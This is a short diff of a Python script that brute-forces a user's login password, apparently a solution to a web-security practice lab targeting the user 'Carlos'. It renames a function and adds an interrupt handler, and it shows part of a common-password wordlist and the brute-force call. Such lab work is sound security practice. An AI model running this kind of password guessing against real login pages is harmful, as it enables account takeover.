@@ -3,7 +3,7 @@ import sys
 
 
 
-def enumerate_password(url, session):
+def bruteforce_password(url, session):
     passwords = [
         "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111", "1234567", "dragon",
         "123123", "baseball", "abc123", "football", "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop",
@@ -37,7 +37,7 @@ def main():
 
 
         print("(+) Brute-forcing Carlos's password...")
-        password = enumerate_password(url, session)
+        password = bruteforce_password(url, session)
         if password:
             print(f"(+) Password found: {password}")
         else:
@@ -52,6 +52,9 @@ def main():
 
     except requests.exceptions.ConnectionError:
         print("(-) Unable to connect to host. Please check your URL and try again.")
+
+    except KeyboardInterrupt:
+        sys.exit(1)
 
 
 if __name__ == "__main__":
